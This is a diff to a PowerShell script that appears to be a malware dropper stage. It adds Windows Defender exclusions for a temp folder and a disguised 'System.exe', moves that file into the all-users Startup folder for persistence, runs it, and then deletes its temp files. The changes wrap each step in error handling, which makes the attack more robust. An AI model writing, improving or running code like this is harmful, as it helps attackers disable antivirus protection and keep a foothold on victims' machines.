@@ -1,25 +1,38 @@
 $ErrorActionPreference = "Stop"
 $tempDir = "$env:TEMP\rt"
 $exePath = "$tempDir\System.exe"
-$startupPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\System.exe"
+$startupDir = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+$startupPath = "$startupDir\System.exe"
 
-# Ensure startup folder exists (it usually does, but just in case)
-if (-not (Test-Path (Split-Path $startupPath))) {
-    New-Item -ItemType Directory -Path (Split-Path $startupPath) -Force
+# Ensure startup folder exists
+if (-not (Test-Path $startupDir)) {
+    New-Item -ItemType Directory -Path $startupDir -Force
 }
 
 # Add Defender Exclusions
-Add-MpPreference -ExclusionPath $tempDir
-Add-MpPreference -ExclusionPath $startupPath
-Add-MpPreference -ExclusionProcess "System.exe"
+try {
+    Add-MpPreference -ExclusionPath $tempDir
+    Add-MpPreference -ExclusionPath $startupPath
+    Add-MpPreference -ExclusionProcess "System.exe"
+} catch {
+    Write-Warning "Defender exclusion failed: $_"
+}
 
 # Move to Startup
-Move-Item -Path $exePath -Destination $startupPath -Force
+try {
+    Move-Item -Path $exePath -Destination $startupPath -Force
+} catch {
+    Write-Error "Move failed: $_"
+    exit 1
+}
 
-# Run once to verify
-Start-Process $startupPath -Wait
+# Run once
+try {
+    Start-Process $startupPath -Wait
+} catch {
+    Write-Warning "Execution failed: $_"
+}
 
 # Self-delete
-# Use a separate process to ensure P2.ps1 can exit cleanly
 $cleanupCommand = "Start-Sleep -Seconds 5; Remove-Item -Recurse -Force '$tempDir'"
-Start-Process powershell -ArgumentList "-NoProfile -Command `"$cleanupCommand`""
+Start-Process powershell -ArgumentList "-NoProfile -Command $cleanupCommand"
